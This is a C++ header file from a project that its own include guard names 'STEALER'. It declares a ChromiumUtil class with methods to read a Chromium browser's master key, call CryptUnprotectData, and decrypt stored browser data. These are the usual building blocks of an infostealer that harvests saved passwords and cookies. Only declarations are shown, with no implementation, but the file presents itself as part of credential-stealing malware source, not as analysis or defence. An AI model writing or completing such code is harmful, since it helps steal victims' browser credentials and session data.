//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CHROMIUMUTIL_H
#define STEALER_CHROMIUMUTIL_H

#include "../../Includes.h"
#include "json.hpp"

using json = nlohmann::json;

class ChromiumUtil {
public:
    static std::vector<BYTE> getMasterKey(const fs::path &path);
    static std::string decryptData(const std::vector<BYTE> &buffer, const std::vector<BYTE> &master_Key);
private:
    static std::vector<BYTE> CryptUnprotectDataWrapper(const std::vector<BYTE> &data);
};


#endif //STEALER_CHROMIUMUTIL_H
